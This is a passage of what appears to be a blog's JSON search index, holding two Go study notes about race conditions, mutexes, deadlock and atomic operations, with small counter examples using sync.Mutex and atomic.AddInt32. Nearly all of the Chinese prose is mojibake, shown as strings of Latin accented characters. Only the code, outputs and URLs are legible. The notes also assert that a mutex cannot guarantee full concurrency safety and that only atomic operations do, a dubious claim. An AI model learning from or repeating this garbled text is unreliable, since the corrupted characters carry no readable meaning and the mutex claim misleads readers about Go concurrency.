çš„å¹¶å‘ç¼–ç¨‹ç›¸å…³çš„æ ¸å¿ƒçŸ¥è¯†â€”â€”ç«æ€æ¡ä»¶ã€ä¸´ç•ŒåŒºã€åŒæ­¥å·¥å…·ä»¥åŠæ­»é”ã€‚","text":"è¿™ç¯‡ç¬”è®°ä¸»è¦æ¥ä»‹ç» Go çš„å¹¶å‘ç¼–ç¨‹ç›¸å…³çš„æ ¸å¿ƒçŸ¥è¯†â€”â€”ç«æ€æ¡ä»¶ã€ä¸´ç•ŒåŒºã€åŒæ­¥å·¥å…·ä»¥åŠæ­»é”ã€‚ ç«æ€æ¡ä»¶å¦‚æœä¸¤ä¸ªæˆ–è€…å¤šä¸ª goroutine åœ¨æ²¡æœ‰äº’ç›¸åŒæ­¥çš„æƒ…å†µä¸‹ï¼Œè®¿é—®æŸä¸ªå…±äº«çš„èµ„æºï¼Œå¹¶è¯•å›¾åŒæ—¶è¯»å’Œå†™è¿™ä¸ªèµ„æºï¼Œå°±å¤„äºç›¸äº’ç«äº‰çš„çŠ¶æ€ï¼Œè¿™ç§æƒ…å†µè¢«ç§°ä½œç«äº‰æ¡ä»¶ï¼ˆrace conditionï¼‰ï¼Œä¹Ÿå«åšç«äº‰çŠ¶æ€ã€‚ å¯¹ä¸€ä¸ªå…±äº«èµ„æºçš„è¯»å’Œå†™æ“ä½œå¿…é¡»æ˜¯åŸå­åŒ–çš„ï¼Œæ¢å¥è¯è¯´ï¼ŒåŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ª goroutine å¯¹å…±äº«èµ„æºè¿›è¡Œè¯»å’Œå†™æ“ä½œï¼Œå¦åˆ™å°±ä¼šå‡ºç°å¹¶å‘å®‰å…¨é—®é¢˜ï¼Œä¼šç ´åå…±äº«æ•°æ®çš„ä¸€è‡´æ€§ã€‚ è¿™ç§é”™è¯¯ä¸€èˆ¬éƒ½å¾ˆéš¾å‘ç°å’Œå®šä½ï¼Œæ’æŸ¥èµ·æ¥çš„æˆæœ¬ä¹Ÿæ˜¯éå¸¸é«˜çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦å°½é‡é¿å…ã€‚ ä¸‹é¢é€šè¿‡ä¸€æ®µç¤ºä¾‹ä»£ç æ¥åŠ æ·±å°è±¡ï¼š 123456789101112131415161718192021222324252627282930313233343536373839var ( // counter æ˜¯ä¸€ä¸ªå…¨å±€å…±äº«å˜é‡ counter int // wg ç”¨æ¥ç­‰å¾…ç¨‹åºç»“æŸ wg sync.WaitGroup)func main() &#123; // è®¡æ•°å¢åŠ 2ï¼Œè¡¨ç¤ºç­‰å¾…ä¸¤ä¸ª goroutine wg.Add(2) go incCounter() go incCounter() // ç­‰å¾…å‰é¢çš„ä¸¤ä¸ª goroutine ç»“æŸ wg.Wait() fmt.Println(\"Final Counter:\", counter)&#125;func incCounter() &#123; // ä¿è¯ incCounter å‡½æ•°é€€å‡ºæ—¶ï¼Œé€šçŸ¥ main goroutine defer wg.Done() for count := 0; count &lt; 2; count++ &#123; // æ•è· counter çš„å€¼ value := counter // å½“å‰ goroutine ä»çº¿ç¨‹é€€å‡ºï¼Œå¹¶æ”¾å›é˜Ÿåˆ— runtime.Gosched() // è¿™é‡Œä½¿ç”¨ runtime.Gosched() å‡½æ•°ï¼Œç”¨æ¥æ¨¡æ‹Ÿå‘ç”Ÿ I/O æ—¶ï¼Œçº¿ç¨‹åˆ‡æ¢çš„åœºæ™¯ // å¢åŠ æœ¬åœ° value å˜é‡çš„å€¼ value++ // å°†value èµ‹å€¼ç»™ counter counter = value &#125;&#125; ç¤ºä¾‹ä»£ç ä¸­ï¼Œä½¿ç”¨äº† runtime.Gosched() å‡½æ•°ï¼Œç”¨æ¥æ¨¡æ‹Ÿå‘ç”Ÿ I/O æ—¶ï¼Œçº¿ç¨‹åˆ‡æ¢çš„åœºæ™¯ã€‚ å…³äºsync.WaitGroup åé¢çš„ç¬”è®°ä¼šè¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œåªéœ€è¦äº†è§£æ˜¯ç”¨æ¥é˜»å¡ main goroutine æ‰§è¡Œå®Œç›´æ¥é€€å‡ºçš„ã€‚ æ‰§è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 1Final Counter: 2 æ€ä¹ˆä¼šæ˜¯ 2 å‘¢ï¼Ÿ\\æ¯ä¸ª goroutine å„æ‰§è¡Œä¸¤æ¬¡ï¼Œä¸€å…±æ˜¯å››æ¬¡è¯»å†™æ“ä½œï¼Œåº”è¯¥æ˜¯ 4 æ‰å¯¹å‘€ã€‚ è¿™ä¸ªå°±æ˜¯å…±äº«èµ„æºå¼•å‘çš„å¹¶å‘é—®é¢˜ã€‚ é‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿè¿™é€šå¸¸å°±ä¼šæ¶‰åŠåŒæ­¥ã€‚ æ¦‚æ‹¬æ¥è®²ï¼ŒåŒæ­¥çš„ç”¨é€”æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯é¿å…å¤šä¸ªçº¿ç¨‹åœ¨åŒä¸€æ—¶åˆ»æ“ä½œåŒä¸€ä¸ªæ•°æ®å—ï¼Œå¦ä¸€ä¸ªæ˜¯åè°ƒå¤šä¸ªçº¿ç¨‹ï¼Œä»¥é¿å…å®ƒä»¬åœ¨åŒä¸€æ—¶åˆ»æ‰§è¡ŒåŒä¸€ä¸ªä»£ç å—ã€‚ ç”±äºè¿™æ ·çš„æ•°æ®å—å’Œä»£ç å—çš„èƒŒåéƒ½éšå«ç€ä¸€ç§æˆ–å¤šç§èµ„æºï¼ˆæ¯”å¦‚å­˜å‚¨èµ„æºã€è®¡ç®—èµ„æºã€I/O èµ„æºã€ç½‘ç»œèµ„æºç­‰ç­‰ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥æŠŠå®ƒä»¬çœ‹åšæ˜¯å…±äº«èµ„æºï¼Œæˆ–è€…è¯´å…±äº«èµ„æºçš„ä»£è¡¨ã€‚ å› æ­¤åŒæ­¥å…¶å®å°±æ˜¯åœ¨æ§åˆ¶å¤šä¸ªçº¿ç¨‹å¯¹å…±äº«èµ„æºçš„è®¿é—®â€”â€”ä¸€ä¸ªçº¿ç¨‹åœ¨æƒ³è¦è®¿é—®æŸä¸€ä¸ªå…±äº«èµ„æºçš„æ—¶å€™ï¼Œéœ€è¦å…ˆç”³è¯·å¯¹è¯¥èµ„æºçš„è®¿é—®æƒé™ï¼Œå¹¶ä¸”åªæœ‰åœ¨ç”³è¯·æˆåŠŸä¹‹åï¼Œè®¿é—®æ‰èƒ½çœŸæ­£å¼€å§‹ã€‚ è€Œå½“çº¿ç¨‹å¯¹å…±äº«èµ„æºçš„è®¿é—®ç»“æŸæ—¶ï¼Œå®ƒè¿˜å¿…é¡»å½’è¿˜å¯¹è¯¥èµ„æºçš„è®¿é—®æƒé™ï¼Œè‹¥è¦å†æ¬¡è®¿é—®ä»éœ€ç”³è¯·ã€‚ ä¸´ç•ŒåŒºå¯ä»¥æŠŠè¿™é‡Œæ‰€è¯´çš„è®¿é—®æƒé™æƒ³è±¡æˆä¸€å—ä»¤ç‰Œï¼Œçº¿ç¨‹ä¸€æ—¦æ‹¿åˆ°äº†ä»¤ç‰Œï¼Œå°±å¯ä»¥è¿›å…¥æŒ‡å®šçš„åŒºåŸŸï¼Œä»è€Œè®¿é—®åˆ°èµ„æºï¼Œè€Œä¸€æ—¦çº¿ç¨‹è¦ç¦»å¼€è¿™ä¸ªåŒºåŸŸäº†ï¼Œå°±éœ€è¦æŠŠä»¤ç‰Œè¿˜å›å»ï¼Œç»ä¸èƒ½æŠŠä»¤ç‰Œå¸¦èµ°ï¼Œå› ä¸ºä¸€æ—¦å¸¦èµ°ä¼šå¼•å‘æ­»é”ã€‚ å¦‚æœé’ˆå¯¹æŸä¸ªå…±äº«èµ„æºçš„è®¿é—®ä»¤ç‰Œåªæœ‰ä¸€å—ï¼Œé‚£ä¹ˆåœ¨åŒä¸€æ—¶åˆ»ï¼Œå°±æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹è¿›å…¥åˆ°é‚£ä¸ªåŒºåŸŸï¼Œå¹¶è®¿é—®åˆ°è¯¥èµ„æºã€‚ è¿™æ—¶ï¼Œå¯ä»¥è¯´ï¼Œå¤šä¸ªå¹¶å‘è¿è¡Œçš„çº¿ç¨‹å¯¹è¿™ä¸ªå…±äº«èµ„æºçš„è®¿é—®æ˜¯å®Œå…¨ä¸²è¡Œçš„ã€‚ åªè¦ä¸€ä¸ªä»£ç ç‰‡æ®µéœ€è¦å®ç°å¯¹å…±äº«èµ„æºçš„ä¸²è¡ŒåŒ–è®¿é—®ï¼Œå°±å¯ä»¥è¢«è§†ä¸ºä¸€ä¸ªä¸´ç•ŒåŒºï¼ˆcritical sectionï¼‰ã€‚ æ¯”å¦‚ï¼Œåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œå®ç°äº†æ•°æ®å—ï¼ˆcounter å˜é‡ï¼‰å†™å…¥æ“ä½œçš„ä»£ç å°±å…±åŒç»„æˆäº†ä¸€ä¸ªä¸´ç•ŒåŒºã€‚å¦‚æœé’ˆå¯¹åŒä¸€ä¸ªå…±äº«èµ„æºï¼Œè¿™æ ·çš„ä»£ç ç‰‡æ®µæœ‰å¤šä¸ªï¼Œé‚£ä¹ˆå®ƒä»¬å°±å¯ä»¥è¢«ç§°ä¸ºç›¸å…³ä¸´ç•ŒåŒºã€‚ åŒæ­¥å·¥å…·ä¸´ç•ŒåŒºå¯ä»¥æ˜¯ä¸€ä¸ªå†…å«äº†å…±äº«æ•°æ®çš„ç»“æ„ä½“åŠå…¶æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æ˜¯æ“ä½œåŒä¸€å—å…±äº«æ•°æ®çš„å¤šä¸ªå‡½æ•°ã€‚ ä¸´ç•ŒåŒºæ€»æ˜¯éœ€è¦å—åˆ°ä¿æŠ¤çš„ï¼Œå¦åˆ™å°±ä¼šäº§ç”Ÿç«æ€æ¡ä»¶ã€‚æ–½åŠ ä¿æŠ¤çš„é‡è¦æ‰‹æ®µä¹‹ä¸€ï¼Œå°±æ˜¯ä½¿ç”¨å®ç°äº†æŸç§åŒæ­¥æœºåˆ¶çš„å·¥å…·ï¼Œä¹Ÿç§°ä¸ºåŒæ­¥å·¥å…·ã€‚ ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¥æ›´æ¸…æ™°åœ°ç†è§£ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼š åœ¨ Go è¯­è¨€ä¸­ï¼ŒåŒæ­¥å·¥å…·å¹¶ä¸å°‘ã€‚å…¶ä¸­ï¼Œæœ€é‡è¦ä¸”æœ€å¸¸ç”¨çš„åŒæ­¥å·¥å…·å½“å±äº’æ–¥é‡ï¼ˆmutual exclusionï¼Œç®€ç§° mutexï¼‰ã€‚sync åŒ…ä¸­çš„Mutex å°±æ˜¯ä¸å…¶å¯¹åº”çš„ç±»å‹ï¼Œè¯¥ç±»å‹çš„å€¼å¯ä»¥è¢«ç§°ä¸ºäº’æ–¥é‡æˆ–è€…äº’æ–¥é”ã€‚ ä¸€ä¸ªäº’æ–¥é”å¯ä»¥è¢«ç”¨æ¥ä¿æŠ¤ä¸€ä¸ªä¸´ç•ŒåŒºæˆ–è€…ä¸€ç»„ç›¸å…³ä¸´ç•ŒåŒºã€‚ å› ä¸ºæ¯å½“æœ‰ goroutine æƒ³è¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œéƒ½éœ€è¦å…ˆå¯¹å®ƒè¿›è¡Œé”å®šï¼Œå¹¶ä¸”ï¼Œæ¯ä¸ª goroutine ç¦»å¼€ä¸´ç•ŒåŒºæ—¶ï¼Œéƒ½è¦åŠæ—¶åœ°å¯¹å®ƒè¿›è¡Œè§£é”ã€‚å› æ­¤å¯ä»¥é€šè¿‡å®ƒæ¥ä¿è¯ï¼Œåœ¨åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ª goroutine å¤„äºè¯¥ä¸´ç•ŒåŒºä¹‹å†…ã€‚ ä¸‹é¢ä½¿ç”¨äº’æ–¥é”æ¥ä¿®æ”¹å‰é¢çš„ç¤ºä¾‹ä»£ç ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥è¾¾åˆ°é¢„æœŸç»“æœï¼š 123456789101112131415161718192021222324252627282930313233343536373839var ( counter int wg sync.WaitGroup // å£°æ˜ä¸€ä¸ª Mutex ç±»å‹çš„å˜é‡ mu sync.Mutex)func main() &#123; wg.Add(2) go incCounter() go incCounter() wg.Wait() fmt.Println(\"Final Counter:\", counter)&#125;func incCounter() &#123; // äº’æ–¥é‡çš„é›¶å€¼æ˜¯å¯ç”¨çš„ï¼Œå› æ­¤ä¸éœ€è¦åˆå§‹åŒ– mu.Lock() defer func() &#123; // è§£é”å¾ˆé‡è¦ï¼Œä¸€å®šä¸èƒ½å¿˜è®° mu.Unlock() wg.Done() &#125;() for count := 0; count &lt; 2; count++ &#123; value := counter runtime.Gosched() value++ counter = value &#125;&#125; ä¿®æ”¹ä¹‹åçš„ç¤ºä¾‹ä»£ç ï¼Œå£°æ˜äº†ä¸€ä¸ª Mutex ç±»å‹çš„å˜é‡ï¼Œåœ¨ incCounter() å‡½æ•°ä¸­ï¼ˆä¸´ç•ŒåŒºï¼‰ï¼Œåˆ†åˆ«åŠ é” mu.Lock() å’Œè§£é” mu.Unlock äº†ã€‚ å› ä¸º defer å…³é”®å­—çš„å­˜åœ¨ï¼Œè§£é”æ“ä½œä¼šåœ¨ incCounter() å‡½æ•°è°ƒç”¨å®Œæˆä¹‹åï¼Œæœ€åå»è§£é”ã€‚ è¿è¡Œä¿®æ”¹ä¹‹åçš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 1Final Counter: 4 ç¬¦åˆé¢„æœŸã€‚ ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä½¿ç”¨äº’æ–¥é”ç”¨æ¥è§£å†³ç¤ºä¾‹ä»£ç ä¸­çš„åŸå­æ€§é—®é¢˜ï¼Œå¹¶ä¸æ˜¯æœ€ä½³çš„ï¼Œä¸èƒ½ä¿è¯ç»å¯¹çš„å¹¶å‘å®‰å…¨ï¼Œè‡³äºä¸ºä»€ä¹ˆï¼Œä»¥åŠåˆè¯¥é€‰æ‹©ä»€ä¹ˆæ–¹å¼è§£å†³åŸå­æ€§é—®é¢˜ï¼Œå¯ä»¥çœ‹è¿™ç¯‡ç¬”è®°ã€‚ æ­»é”Go è™½ç„¶æä¾›äº†ä¸å°‘åŒæ­¥å·¥å…·ç”¨æ¥è§£å†³ç«æ€æ¡ä»¶çš„é—®é¢˜ï¼Œä½†å¦‚æœä½¿ç”¨ä¸å½“ï¼Œä¸ä½†ä¼šè®©ç¨‹åºå˜æ…¢ï¼Œè¿˜ä¼šå¤§å¤§å¢åŠ æ­»é”ï¼ˆdeadlockï¼‰çš„å¯èƒ½æ€§ã€‚ æ‰€è°“çš„æ­»é”ï¼ŒæŒ‡çš„å°±æ˜¯å½“å‰ç¨‹åºä¸­çš„main goroutineï¼Œä»¥åŠå¼€å‘è€…è‡ªå·±â€œåˆ›å»ºâ€çš„ goroutineï¼ˆè¿™äº› goroutine å¯ä»¥è¢«ç»Ÿç§°ä¸ºç”¨æˆ·çº§çš„ goroutineï¼‰ éƒ½å·²ç»è¢«é˜»å¡ã€‚è¿™å°±ç›¸å½“äºæ•´ä¸ªç¨‹åºéƒ½å·²ç»åœæ»ä¸å‰äº†ã€‚ Go è¯­è¨€è¿è¡Œæ—¶ç³»ç»Ÿæ˜¯ä¸å…è®¸è¿™ç§æƒ…å†µå‡ºç°çš„ï¼Œåªè¦å®ƒå‘ç°æ‰€æœ‰çš„ç”¨æˆ·çº§ goroutine éƒ½å¤„äºç­‰å¾…çŠ¶æ€ï¼Œå°±ä¼šè‡ªè¡ŒæŠ›å‡ºä¸€ä¸ªå¸¦æœ‰å¦‚ä¸‹ä¿¡æ¯çš„ panicï¼š 1fatal error: all goroutines are asleep - deadlock! æ³¨æ„ï¼Œè¿™ç§ç”± Go è¯­è¨€è¿è¡Œæ—¶ç³»ç»Ÿè‡ªè¡ŒæŠ›å‡ºçš„ panic éƒ½å±äºè‡´å‘½é”™è¯¯ï¼Œéƒ½æ˜¯æ— æ³•è¢«æ¢å¤çš„ï¼Œè°ƒç”¨recover å‡½æ•°å¯¹å®ƒä»¬èµ·ä¸åˆ°ä»»ä½•ä½œç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦äº§ç”Ÿæ­»é”ï¼Œç¨‹åºå¿…ç„¶å´©æºƒã€‚ å› æ­¤ï¼Œä¸€å®šè¦å°½å¯èƒ½é¿å…æ­»é”çš„å‘ç”Ÿã€‚è€Œæœ€ç®€å•ã€æœ‰æ•ˆçš„æ–¹å¼å°±æ˜¯è®©æ¯ä¸€ä¸ªäº’æ–¥é”éƒ½åªä¿æŠ¤ä¸€ä¸ªä¸´ç•ŒåŒºæˆ–ä¸€ç»„ç›¸å…³ä¸´ç•ŒåŒºã€‚ è€Œä¸”ï¼Œå¯¹äºåŒä¸€ä¸ª goroutine è€Œè¨€ï¼Œæ—¢ä¸è¦é‡å¤é”å®šä¸€ä¸ªäº’æ–¥é”ï¼Œä¹Ÿä¸è¦å¿˜è®°å¯¹å®ƒè¿›è¡Œè§£é”ã€‚ å› æ­¤é€šå¸¸ä¼šåœ¨ mu.Lock() æ“ä½œçš„åé¢ç´§è·Ÿä¸€ä¸ª defer Unlock()ï¼Œè¿™æ˜¯æœ€ä¿é™©çš„ä¸€ç§åšæ³•ã€‚ æ€»ç»“ äº’æ–¥é”å¸¸å¸¸è¢«ç”¨æ¥ï¼šä¿è¯å¤šä¸ª goroutine å¹¶å‘åœ°è®¿é—®åŒä¸€ä¸ªå…±äº«èµ„æºæ—¶çš„å®Œå…¨ä¸²è¡Œ ä¸è¦é‡å¤é”å®šäº’æ–¥é” ä¸è¦å¿˜è®°è§£é”äº’æ–¥é”ï¼Œé€šå¸¸é…åˆä½¿ç”¨ defer è¯­å¥è§£é” ä¸è¦å¯¹å°šæœªé”å®šçš„äº’æ–¥é”è§£é” ä¸è¦åœ¨å¤šä¸ªå‡½æ•°ä¹‹é—´ç›´æ¥ä¼ é€’äº’æ–¥é”","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”åŸå­æ“ä½œ","slug":"go-language-study-notes-atomic-operation","date":"2022-11-08T09:14:14.000Z","updated":"2023-02-18T03:28:33.586Z","comments":true,"path":"go-language-study-notes-atomic-operation/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-atomic-operation/","excerpt":"é€šè¿‡å‰é¢çš„ç¬”è®°ï¼Œäº†è§£åˆ°äº† Go çš„åŒæ­¥å·¥å…·â€”â€”äº’æ–¥é”çš„ç›¸å…³çŸ¥è¯†ã€‚ é€šè¿‡å¯¹äº’æ–¥é”çš„åˆç†ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ä¸€ä¸ª goroutine åœ¨æ‰§è¡Œä¸´ç•ŒåŒºä¸­çš„ä»£ç æ—¶ï¼Œä¸è¢«å…¶ä»–çš„ goroutine æ‰“æ‰°ï¼ˆä¿è¯ä¸´ç•ŒåŒºä¸­ä»£ç çš„ä¸²è¡Œæ‰§è¡Œï¼‰ã€‚ä¸è¿‡ï¼Œè™½ç„¶ä¸ä¼šè¢«æ‰“æ‰°ï¼Œä½†æ˜¯å®ƒä»ç„¶å¯èƒ½ä¼šè¢«ä¸­æ–­ï¼ˆinterruptionï¼‰ã€‚","text":"é€šè¿‡å‰é¢çš„ç¬”è®°ï¼Œäº†è§£åˆ°äº† Go çš„åŒæ­¥å·¥å…·â€”â€”äº’æ–¥é”çš„ç›¸å…³çŸ¥è¯†ã€‚ é€šè¿‡å¯¹äº’æ–¥é”çš„åˆç†ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ä¸€ä¸ª goroutine åœ¨æ‰§è¡Œä¸´ç•ŒåŒºä¸­çš„ä»£ç æ—¶ï¼Œä¸è¢«å…¶ä»–çš„ goroutine æ‰“æ‰°ï¼ˆä¿è¯ä¸´ç•ŒåŒºä¸­ä»£ç çš„ä¸²è¡Œæ‰§è¡Œï¼‰ã€‚ä¸è¿‡ï¼Œè™½ç„¶ä¸ä¼šè¢«æ‰“æ‰°ï¼Œä½†æ˜¯å®ƒä»ç„¶å¯èƒ½ä¼šè¢«ä¸­æ–­ï¼ˆinterruptionï¼‰ã€‚ åŸå­æ“ä½œé€šè¿‡å‰é¢å­¦ä¹  goroutine çš„è°ƒåº¦åŸç†å¯ä»¥çŸ¥é“ï¼Œgoroutine è°ƒåº¦å™¨ä¼šä»æœ¬åœ°è¿è¡Œé˜Ÿåˆ—ä¾æ¬¡è°ƒç”¨é˜Ÿåˆ—ä¸­çš„ goroutine ä¸ç‰©ç†å¤„ç†å™¨ M è¿è¡Œï¼Œ å› æ­¤ï¼Œåœ¨åŒä¸€æ—¶åˆ»ï¼Œåªå¯èƒ½æœ‰å°‘æ•°çš„ goroutine çœŸæ­£åœ°å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå¹¶ä¸”è¿™ä¸ªæ•°é‡åªä¼šä¸ M çš„æ•°é‡ä¸€è‡´ï¼Œè€Œä¸ä¼šéšç€é˜Ÿåˆ—ä¸­çš„ goroutine å¢å¤šè€Œå¢é•¿ã€‚ å½“é‡åˆ°é˜»å¡çš„ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œè°ƒåº¦å™¨ä¼šå°†ç­‰å¾…ç³»ç»Ÿè°ƒç”¨çš„ goroutine æš‚æ—¶æ¢ä¸‹ï¼ŒåŒæ—¶ä¼šä»æœ¬åœ°è¿è¡Œé˜Ÿåˆ—é‡Œæ¢ä¸Šå¦å¤–ä¸€ä¸ª goroutine æ¥è¿è¡Œã€‚ è¿™é‡Œçš„æ¢ä¸Šçš„æ„æ€æ˜¯ï¼Œè®©ä¸€ä¸ª goroutine ç”±éè¿è¡ŒçŠ¶æ€è½¬ä¸ºè¿è¡ŒçŠ¶æ€ï¼Œå¹¶ä¿ƒä½¿å…¶ä¸­çš„ä»£ç åœ¨æŸä¸ª CPU æ ¸å¿ƒä¸Šæ‰§è¡Œã€‚æ¢ä¸‹çš„æ„æ€æ­£å¥½ç›¸åï¼Œå³ï¼šä½¿ä¸€ä¸ª goroutine ä¸­çš„ä»£ç ä¸­æ–­æ‰§è¡Œï¼Œå¹¶è®©å®ƒç”±è¿è¡ŒçŠ¶æ€è½¬ä¸ºéè¿è¡ŒçŠ¶æ€ã€‚ è¿™ä¸ªä¸­æ–­çš„æ—¶æœºæœ‰å¾ˆå¤šï¼Œä»»ä½•ä¸¤æ¡è¯­å¥æ‰§è¡Œçš„é—´éš™ï¼Œç”šè‡³åœ¨æŸæ¡è¯­å¥æ‰§è¡Œçš„è¿‡ç¨‹ä¸­éƒ½æ˜¯å¯ä»¥çš„ã€‚ å³ä½¿è¿™äº›è¯­å¥åœ¨ä¸´ç•ŒåŒºä¹‹å†…ä¹Ÿæ˜¯å¦‚æ­¤ã€‚æ‰€ä»¥ï¼Œäº’æ–¥é”è™½ç„¶å¯ä»¥ä¿è¯ä¸´ç•ŒåŒºä¸­ä»£ç çš„ä¸²è¡Œæ‰§è¡Œï¼Œä½†å´ä¸èƒ½ä¿è¯è¿™äº›ä»£ç æ‰§è¡Œçš„åŸå­æ€§ï¼ˆatomicityï¼‰ã€‚ åœ¨ä¼—å¤šçš„åŒæ­¥å·¥å…·ä¸­ï¼ŒçœŸæ­£èƒ½å¤Ÿä¿è¯åŸå­æ€§æ‰§è¡Œçš„åªæœ‰åŸå­æ“ä½œï¼ˆatomic operationï¼‰ã€‚åŸå­æ“ä½œåœ¨è¿›è¡Œçš„è¿‡ç¨‹ä¸­æ˜¯ä¸å…è®¸ä¸­æ–­çš„ã€‚åœ¨åº•å±‚ï¼Œè¿™ä¼šç”± CPU æä¾›èŠ¯ç‰‡çº§åˆ«çš„æ”¯æŒï¼Œæ‰€ä»¥ç»å¯¹æœ‰æ•ˆã€‚å³ä½¿åœ¨æ‹¥æœ‰å¤š CPU æ ¸å¿ƒï¼Œæˆ–è€…å¤š CPU çš„è®¡ç®—æœºç³»ç»Ÿä¸­ï¼ŒåŸå­æ“ä½œçš„ä¿è¯ä¹Ÿæ˜¯ä¸å¯æ’¼åŠ¨çš„ã€‚ è¿™ä½¿å¾—åŸå­æ“ä½œå¯ä»¥å®Œå…¨åœ°æ¶ˆé™¤ç«æ€æ¡ä»¶ï¼Œå¹¶èƒ½å¤Ÿç»å¯¹åœ°ä¿è¯å¹¶å‘å®‰å…¨æ€§ã€‚å¹¶ä¸”ï¼Œå®ƒçš„æ‰§è¡Œé€Ÿåº¦è¦æ¯”å…¶ä»–çš„åŒæ­¥å·¥å…·å¿«å¾—å¤šï¼Œé€šå¸¸ä¼šé«˜å‡ºå¥½å‡ ä¸ªæ•°é‡çº§ã€‚ä¸è¿‡ï¼Œå®ƒçš„ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ã€‚ æ­£æ˜¯å› ä¸ºåŸå­æ“ä½œä¸èƒ½è¢«ä¸­æ–­ï¼Œæ‰€ä»¥å®ƒéœ€è¦è¶³å¤Ÿç®€å•ï¼Œå¹¶ä¸”è¦æ±‚å¿«é€Ÿå®Œæˆã€‚ å› ä¸ºå¦‚æœåŸå­æ“ä½œè¿Ÿè¿Ÿä¸èƒ½å®Œæˆï¼Œè€Œå®ƒåˆä¸ä¼šè¢«ä¸­æ–­ï¼Œè¿™å°†ç»™è®¡ç®—æœºæ‰§è¡ŒæŒ‡ä»¤çš„æ•ˆç‡å¸¦æ¥å¾ˆå¤§çš„å½±å“ã€‚ sync.atomicGo è¯­è¨€çš„åŸå­æ“ä½œå½“ç„¶æ˜¯åŸºäº CPU å’Œæ“ä½œç³»ç»Ÿçš„ï¼Œæ‰€ä»¥å®ƒä¹Ÿåªé’ˆå¯¹å°‘æ•°æ•°æ®ç±»å‹çš„å€¼æä¾›äº†åŸå­æ“ä½œå‡½æ•°ã€‚è¿™äº›å‡½æ•°éƒ½å­˜åœ¨äºæ ‡å‡†åº“ä»£ç åŒ… sync/atomic ä¸­ã€‚ sync/atomic åŒ…ä¸­çš„å‡½æ•°å¯ä»¥åšçš„åŸå­æ“ä½œæœ‰ï¼š åŠ æ³•ï¼ˆaddï¼‰ æ¯”è¾ƒå¹¶äº¤æ¢ï¼ˆcompare and swapï¼Œç®€ç§° CASï¼‰ åŠ è½½ï¼ˆloadï¼‰å­˜å‚¨ï¼ˆstoreï¼‰å’Œäº¤æ¢ï¼ˆswapï¼‰ è¿™äº›å‡½æ•°é’ˆå¯¹çš„æ•°æ®ç±»å‹å¹¶ä¸å¤šã€‚ä½†æ˜¯ï¼Œå¯¹è¿™äº›ç±»å‹ä¸­çš„æ¯ä¸€ä¸ªï¼Œsync/atomic åŒ…éƒ½ä¼šæœ‰ä¸€å¥—å‡½æ•°ç»™äºˆæ”¯æŒã€‚è¿™äº›æ•°æ®ç±»å‹æœ‰ï¼šint32ã€int64ã€uint32ã€uint64ã€uintptrï¼Œä»¥åŠunsafe åŒ…ä¸­çš„Pointerã€‚ä¸è¿‡ï¼Œé’ˆå¯¹unsafe.Pointerç±»å‹ï¼Œè¯¥åŒ…å¹¶æœªæä¾›è¿›è¡ŒåŸå­åŠ æ³•æ“ä½œçš„å‡½æ•°ã€‚ ä¸‹é¢è¿™æ®µç¤ºä¾‹ä»£ç ï¼Œæ˜¯ä»‹ç» sync.Mutexä¸sync è¿™ç¯‡ç¬”è®°ä¸­çš„ä¸€æ®µä»£ç ï¼Œå½“æ—¶è™½ç„¶ä½¿ç”¨äº’æ–¥é”è§£å†³äº†ç«äº‰æ¡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä¿è¯ç»å¯¹çš„å¹¶å‘å®‰å…¨ï¼Œå¯¹äºåŸå­æ€§é—®é¢˜ï¼Œå°±åº”è¯¥ä½¿ç”¨åŸå­æ“ä½œæ¥è§£å†³ã€‚ ä¸‹é¢ä½¿ç”¨åŸå­æ“ä½œæ¥è§£å†³ï¼š 1234567891011121314151617181920212223242526var ( counter int32 wg sync.WaitGroup)func main() &#123; wg.Add(2) go incCounter() go incCounter() wg.Wait() fmt.Println(\"Final Counter:\", counter)&#125;func incCounter() &#123; defer wg.Done() for count := 0; count &lt; 2; count++ &#123; // å½“å‰ goroutine ä»çº¿ç¨‹é€€å‡ºï¼Œå¹¶æ”¾å›é˜Ÿåˆ— runtime.Gosched() // ç»å¯¹å®‰å…¨åœ°å¯¹ counter åŠ  1 atomic.AddInt32(&amp;counter, 1) &#125;&#125; è¿è¡Œä¸€ä¸‹ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 1Final Counter: 4 å¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿæ˜¯ç¬¦åˆé¢„æœŸçš„ã€‚ åŸå­æ“ä½œä½¿ç”¨å¸¸è§é—®é¢˜ä¸‹é¢é€šè¿‡ä¸€äº›å¸¸è§çš„é—®é¢˜ï¼Œæ¥æ›´æ·±å…¥äº†è§£åŸå­æ“ä½œã€‚ 1. 